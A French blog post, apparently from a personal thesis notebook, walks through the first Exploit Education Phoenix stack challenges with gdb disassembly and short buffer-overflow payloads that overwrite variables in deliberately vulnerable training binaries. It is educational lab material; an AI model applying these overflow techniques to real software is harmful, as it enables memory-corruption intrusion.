@@ -1,0 +1,416 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #faf8f1"
+  lang="fr"
+>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+  
+    
+  
+  <title>Understanding the Stack for Fun and Profit - Part 0x00 - Carnet de thèse</title>
+  <link rel="stylesheet" href="/css/custom.css">
+  <script src="https://kit.fontawesome.com/c28017ba5c.js" crossorigin="anonymous"></script>
+
+  
+  <meta name="theme-color" />
+  
+  <meta name="description" content="
+Analyser un fichier binaire, c&rsquo;est comme interpréter un texte de loi un peu obscur : on cherche l&rsquo;intention de l&rsquo;auteur et les failles du système.
+
+Pendant que l&rsquo;IA semble prendre le dessus sur beaucoup de compétences, je décide de mettre le nez dans l&rsquo;assembleur pour comprendre comment fonctionne concrètement mon ordinateur.
+J&rsquo;ai depuis longtemps eu envie de rentrer un peu plus bas dans le fonctionnement des programmes, de comprendre les inner workings des utilitaires CLI que j&rsquo;utilise au quotidien. Bref, j&rsquo;approfondis de jour en jour mon côté geek. J&rsquo;ai d&rsquo;ailleurs commencé à mettre des autocollants de &ldquo;hacker&rdquo; sur mon ordinateur&hellip;" />
+  <meta
+    name="author"
+    content=""
+  />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="http://localhost:1313/main.min.css" />
+
+  
+
+  
+     
+  <link rel="preload" as="image" href="http://localhost:1313/theme.png" />
+
+  
+  
+  
+  
+
+  
+  <link rel="preload" as="image" href="http://localhost:1313/github.svg" />
+  
+  <link rel="preload" as="image" href="http://localhost:1313/rss.svg" />
+  
+
+  
+  <link rel="icon" href="http://localhost:1313/favicon.ico" />
+  <link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.156.0">
+
+  
+  
+   
+  <link rel="icon" type="image/x-icon" href="/static-files/images/favicon.png">
+</head>
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G3PYPVBPZG"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-G3PYPVBPZG');
+</script>
+
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
+  <div class="relative z-50 mr-auto flex items-center">
+    <a
+      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
+      href="http://localhost:1313/"
+      >Carnet de thèse</a
+    >
+    <div
+      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.svg)_left_center/cover_no-repeat] dark:invert dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#faf8f1'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-6">
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/numerique/"
+        >Numérique</a
+      >
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/about/"
+        >A propos</a
+      >
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/posts/"
+        >Fil d&#39;actualité</a
+      >
+      
+    </nav>
+    
+
+    
+    <nav
+      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
+    >
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./github.svg)"
+        href="https://github.com/carnetdethese"
+        target="_blank"
+        rel="me"
+      >
+        github
+      </a>
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./rss.svg)"
+        href="http://localhost:1313/index.xml"
+        target="_blank"
+        rel="alternate"
+      >
+        rss
+      </a>
+      
+    </nav>
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-20">
+    <h1 class="!my-0 pb-2.5">Understanding the Stack for Fun and Profit - Part 0x00</h1>
+
+    
+    <div class="text-sm opacity-60">
+      
+      <time>Apr 17, 2026</time>
+      
+      
+      <span class="mx-1">&middot;</span>
+      <span>Alexandre</span>
+      
+    </div>
+    
+  </header>
+
+  <section><blockquote>
+<p>Analyser un fichier binaire, c&rsquo;est comme interpréter un texte de loi un peu obscur : on cherche l&rsquo;intention de l&rsquo;auteur et les failles du système.</p>
+</blockquote>
+<p>Pendant que l&rsquo;IA semble prendre le dessus sur beaucoup de compétences, je décide de mettre le nez dans l&rsquo;assembleur pour comprendre comment fonctionne concrètement mon ordinateur.</p>
+<p>J&rsquo;ai depuis longtemps eu envie de rentrer un peu plus bas dans le fonctionnement des programmes, de comprendre les <em>inner workings</em> des utilitaires CLI que j&rsquo;utilise au quotidien. Bref, j&rsquo;approfondis de jour en jour mon côté <code>geek</code>. J&rsquo;ai d&rsquo;ailleurs commencé à mettre des autocollants de &ldquo;hacker&rdquo; sur mon ordinateur&hellip;</p>
+<p>En navigant un peu sur les différents blogs, après avoir regardé quelques unes des excellentes vidéos de <a href="https://www.youtube.com/@LiveOverflow">LiveOverflow</a> et suivi l&rsquo;introduction à l&rsquo;assembleur x86 de <a href="https://youtube.com/playlist?list=PL9o2C-4xGfjHl5PF-Xt-yWH2zc4wjJ3AW&amp;si=nK2wmH8rfIaVzOQT">Mxy</a>, j&rsquo;ai trouvé une VM avec plusieurs challenges permettant d&rsquo;en apprendre un peu plus sur l&rsquo;exploitation des fichiers binaires.</p>
+<p>Il s&rsquo;agit de la VM Phoenix maintenue par Andrew Griffith (<a href="https://exploit.education">Exploit Education</a>), qui contient des binaires codés en C et compilés. L&rsquo;objectif : trouver les failles de ces fichiers. Malgré mon Mac qui fonctionne sur une puce M2 avec une architecture ARM, j&rsquo;ai fait le choix d&rsquo;apprendre l&rsquo;Assembly x86 d&rsquo;Intel qui est le standard pour un grand nombre de machines.</p>
+<p>Les challenges visent à présenter ce qu&rsquo;est un <strong>buffer overflow</strong> et comment l&rsquo;exploiter. Les sept premiers (0-6) se concentrent sur la <em>stack</em> (ou <em>pile</em>).</p>
+<blockquote>
+<p>La stack est une abstraction permettant de représenter un certain type de données temporaires dans la mémoire d&rsquo;un ordinateur. En gros, c&rsquo;est une zone dédiée au stockage de certaines données d&rsquo;exécution et gérée par le CPU. Elle permet notamment d&rsquo;y stocker l&rsquo;adresse de retour d&rsquo;une fonction. L&rsquo;appel d&rsquo;une fonction met, en principe, temporairement &ldquo;sur pause&rdquo; l&rsquo;exécution d&rsquo;un programme (en réalité le CPU continue activement de fonctionner, mais ailleurs dans la mémoire). Pour savoir à quelle adresse le CPU doit revenir une fois l&rsquo;exécution de la fonction terminée, le CPU utilise la <em>stack</em> dans laquelle se trouve cette information. Il utilise pour ça deux registres, qui sont (sur les systèmes 64 bits) : RSP, le curseur mobile, &amp; RBP, qui est la base fixe pour déterminer le début et la fin de la <em>stack frame</em> (ou plus simplement, le début et la fin de la zone dans la <em>stack</em> dédiée à la fonction en cours d&rsquo;exécution). La <em>stack</em> fonctionne sur le principe du LIFO &ndash; Last In, First Out &ndash; qui indique que la dernière valeur entrée dans la <em>stack</em> est la première à en sortir. En Assembleur, c&rsquo;est l&rsquo;instruction <code>CALL</code> qui place l&rsquo;adresse de retour sur la <em>stack</em>.</p>
+</blockquote>
+<p><img src="https://diveintosystems.org/book/C7-x86_64/_images/stackFrame.png" 
+         alt="" 
+         ></p>
+<p>Pour cela, il faut s&rsquo;armer d&rsquo;un débuggeur (<code>gdb</code> est le standard), d&rsquo;un peu de courage et de beaucoup de patience. Après avoir lancé l&rsquo;image de la VM, on peut se connecter via SSH (ce qui est plus pratique que de passer par la console de l&rsquo;émulateur).</p>
+<h2 id="stack-zero">stack-zero</h2>
+<p>Découverte des challenges.C&rsquo;est assez facile une fois qu&rsquo;on arrive à lire les instructions. Le plus dur, c&rsquo;est la prise en main de <code>gdb</code> pour arriver à en faire ce qu&rsquo;on veut.</p>
+<ul>
+<li><strong>Objectif :</strong> Changer la variable <code>changeme</code> (initialisée à 0) par n&rsquo;importe quelle autre valeur.</li>
+<li><strong>Exploitation :</strong> Un simple overflow suffit pour écraser la mémoire adjacente au buffer.</li>
+</ul>
+<p>J&rsquo;ai commencé par chercher à lire les chaînes de caractères présentes dans le binaire avec la commande <code>strings</code>. Rien d&rsquo;intéressant - je passe par <code>gdb</code>.</p>
+<p><code>gdb</code> est un <em>débuggueur</em>. Concrètement, c&rsquo;est un outil qui permet de voir ce qui se passe dans un programme lorsqu&rsquo;il est exécuté. C&rsquo;est un peu le rayon X du reverse engineer. Il permet de lancer le programme, de l&rsquo;arrêter à des étapes précises, d&rsquo;inspecter les registres du CPU à chaque instant de cette exécution, de désassembler le binaire (c&rsquo;est-à-dire, de transformer le langage machine en langage assembleur, compréhensible par un humain), de trouver les adresses mémoires des instructions, etc. C&rsquo;est un outil complet, utilisé par les développeurs pour mieux comprendre les codes produits, mais aussi par les reverse engineers.</p>
+<p>Après avoir lancé <code>gdb</code>, on est accueilli par un shell interactif. En tapant <code>help</code>, on peut lire les différentes commandes disponibles. L&rsquo;une d&rsquo;elles, <code>break</code>, permet de définir un point d&rsquo;interruption pour l&rsquo;examen. Je choisis d&rsquo;interrompre à <code>main</code> - <code>break *main</code>. On commence l&rsquo;exécution, qui place donc le registre (RIP) contenant le pointeur d&rsquo;instruction vers la première instruction du programme (ici, à l&rsquo;adresse 0x4005dd).</p>
+<p>Pour visualiser ces instructions, il faut &ldquo;désassembler&rdquo; le binaire. Pour cela, la commande <code>disas main</code> permet d&rsquo;obtenir la liste des instructions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">=&gt;</span> <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005dd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	    push   rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005de</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	    mov    rbp,rsp
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	    sub    rsp,<span style="color:#ae81ff">0x60</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>:	    mov    <span style="color:#66d9ef">DWORD</span> PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x54</span>],edi
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005e8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    <span style="color:#66d9ef">QWORD</span> PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x60</span>],rsi
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005ec</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400680</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400440</span> <span style="color:#f92672">&lt;</span>puts@plt<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:	mov    <span style="color:#66d9ef">DWORD</span> PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>],<span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005fd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">32</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400601</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400604</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400430</span> <span style="color:#f92672">&lt;</span>gets@plt<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400609</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#66d9ef">DWORD</span> PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000040060c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>:	test   eax,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000040060e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x40061c</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400610</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x4006d0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400615</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">56</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400440</span> <span style="color:#f92672">&lt;</span>puts@plt<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000040061a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">61</span><span style="color:#f92672">&gt;</span>:	jmp    <span style="color:#ae81ff">0x400626</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000040061c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400708</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400621</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400440</span> <span style="color:#f92672">&lt;</span>puts@plt<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400626</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000040062b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400450</span> <span style="color:#f92672">&lt;</span>exit@plt<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Analysons rapidement les instructions. Les deux premières constituent le <em>prologue</em> de la fonction.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">=&gt;</span> <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005dd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	    push   rbp      <span style="color:#75715e">;# On pousse sur la stack la valeur de la base de la stack précédente (pour y revenir plus tard !)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005de</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	    mov    rbp,rsp  <span style="color:#75715e">;# On place cette base de la stack à l&#39;adresse du haut de la stack. Concrètement, cette instruction permet d&#39;initialiser la base de la *stack frame*.</span>
+</span></span></code></pre></div><p>C&rsquo;est là que la <em>stack frame</em> est initialisée.</p>
+<p>Ce qui nous intéresse ensuite c&rsquo;est l&rsquo;appel de la fonction <code>gets</code>. Une recherche dans le manpage nous permet de comprendre que cette fonction de la libraire standard C permet de récupérer l&rsquo;entrée de l&rsquo;utilisateur via le terminal et l&rsquo;enregistre dans la même <strong>sans vérifier la taille de cette entrée</strong>. Par conséquent, le buffer (qui est l&rsquo;espace mémoire alloué pour récupérer cette entrée), déclaré <strong>dans la stack</strong> avec une valeur précise (dans notre exemple, de 64 octets), peut donc être &ldquo;trop rempli&rdquo;. Si tel est le cas, et dans la mesure où le buffer est situé dans la stack, il est possible d&rsquo;envoyer un certain nombre de caractères au binaire qui, ne sachant que faire des octets en trop, les rangera en lieu et place des autres octets présents dans la stack.Parmi eux : d&rsquo;autres variables locales ou, plus loin, l&rsquo;adresse de retour l&rsquo;adresse de la fonction. Notre objectif ici est de modifier l&rsquo;une de ces variables.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000000004005fd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">32</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400601</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400604</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400430</span> <span style="color:#f92672">&lt;</span>gets@plt<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>La fonction gets prend un argument ici : l&rsquo;adresse du buffer dans lequel sera placée l&rsquo;entrée utilisateur. <code>lea</code> (load effective address) permet de créer un pointeur dans RAX vers RBP - 0x50 octets (soit, en décimal, 80 octets). En gros, le buffer est situé à 80 octets de la base de la stack. Reste maintenant à déterminer où se trouve, dans la stack, la variable que nous cherchons à modifier.</p>
+<p>Juste après l&rsquo;appel de la fonction <code>gets</code>, on voit ces lignes-là :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400609</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#66d9ef">DWORD</span> PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000040060c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>:	test   eax,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000040060e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x40061c</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Le code récupère et place dans EAX (qui est le même registre que RAX mais dans sa version 32 bits &ndash; seuls les derniers 32 bits seront remplis) la valeur et non l&rsquo;adresse (<code>mov</code>) de ce qui se trouve à RBP-0x10 octets (soit 16 octets en décimal). Un calcul simple nous permet donc de déterminer la taille du buffer : <code>0x50-0x10 = 0x40</code> ou alors <code>80-16=64</code>.</p>
+<p>Maintenant que l&rsquo;on sait qu&rsquo;il faut envoyer 64 caractères (ou plus précisément, 64 octets) pour arriver dans l&rsquo;espace de la variable <code>changeme</code>, on peut tenter la commande suivante.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;print(&#39;A&#39;*64 + &#39;B&#39;)&#34;</span> | ./stack-zero
+</span></span></code></pre></div><p>Bingo! On obtient le message de victoire. Les 64 &lsquo;A&rsquo; remplissent le buffer, et le &lsquo;B&rsquo; vient déborder exactement sur la variable cible. Challenge réussi.</p>
+<h2 id="stack-one">stack-one</h2>
+<p>Même principe que la stack-zero, mais la différence réside dans la manière dont on injecte l&rsquo;overflow. Dans ce niveau, le programme attend un argument. Si on ne lui en donne pas, il <em>exit</em> sans sommation.</p>
+<p>En analysant le binaire via <code>gdb</code>, on apprend que le programme attend une valeur hexadécimale spécifique : <code>0x496c5962</code>. Comme il s&rsquo;agit d&rsquo;une valeur au format <strong>Little Endian</strong>, il faut récupérer l&rsquo;équivalent ASCII inversé.</p>
+<p>Note sur <strong><a href="https://en.wikipedia.org/wiki/Endianness">Little Endian</a></strong> : en réalité on inverse pas la chaîne de caractères. C&rsquo;est simplement le processeur qui va &ldquo;ranger&rdquo; les octets en commançant par l&rsquo;octet le moins significatif.</p>
+<ul>
+<li><strong>Conversion :</strong> <code>python3 -c &quot;print('\x62\x59\x6c\x49')&quot;</code> donne la chaîne <code>bYlI</code>.</li>
+<li><strong>Payload :</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Automatique avec un pipe </span>
+</span></span><span style="display:flex;"><span>./stack-one <span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#34;print(&#39;A&#39;*64 + &#39;\x62\x59\x6c\x49&#39;)&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ou en version manuelle :</span>
+</span></span><span style="display:flex;"><span>./stack-one AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI
+</span></span></code></pre></div><h2 id="stack-two">stack-two</h2>
+<p>Ici, c&rsquo;est plus complexe. Le programme lit la valeur depuis une <strong>variable d&rsquo;environnement</strong>. Sur les systèmes UNIX, une <em>env var</em> se définit via la commande <code>export</code> (valable uniquement pour la session en cours).</p>
+<p>On apprend que la variable en question est <code>ExploitEducation</code>. En utilisant <code>gdb</code> pour désassembler le programme, on voit que la taille du buffer est toujours de 64 octets.</p>
+<ul>
+<li><strong>Tentative 0x00 :</strong> <code>export ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB</code></li>
+<li><strong>Le problème :</strong> La valeur attendue est <code>0x0d0a090a</code> (en ASCII : <code>\r\n\t\n</code>). En Little Endian, il faut envoyer <code>\n\t\n\r</code>.</li>
+<li><strong>Tentative 0x01 :</strong> <code>export ExploitEducation=AAAA...AAAA\n\t\n\r</code>. Échec. Le programme reçoit <code>0x5c725c6e</code>.</li>
+</ul>
+<p><strong>Réflexion :</strong> Les caractères <code>\n</code> sont interprétés comme du texte brut (<code>\</code> puis <code>n</code>) et non comme des caractères de contrôle. Pour que le shell interprète correctement les séquences d&rsquo;échappement, il faut utiliser <code>printf</code>.</p>
+<ul>
+<li><strong>Solution :</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export ExploitEducation<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\t\n\r&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>./stack-two
+</span></span></code></pre></div><p><strong>Bingo !</strong> Ça fonctionne. Le problème était que l&rsquo;<code>export</code> simple considérait les caractères <code>\n</code>, <code>\t</code> et <code>\r</code> comme des séquences de deux caractères au lieu d&rsquo;un seul caractère ASCII de retour à la ligne.</p>
+<h2 id="stack-three">stack-three</h2>
+<p>Ce niveau marque une étape importante : on ne change plus seulement une variable, on doit rediriger le programme vers une autre fonction via un pointeur se trouvant en fin de stack.</p>
+<blockquote>
+<p>Un pointeur, c&rsquo;est concrètement un lien vers une autre adresse mémoire. C&rsquo;est un peu comme un post-it qui nous indique dans quelle décision du Conseil d&rsquo;État trouver l&rsquo;interprétation du juge sur le recours des tiers dans le cadre du contentieux des contrats. Ou alors la côte d&rsquo;un livre à Cujas. On n&rsquo;écrit pas le texte entier sur le post-it, juste une référence. Cela permet au CPU de manipuler des structures de données immenses sans avoir à les déplacer physiquement dans ses registres internes.</p>
+</blockquote>
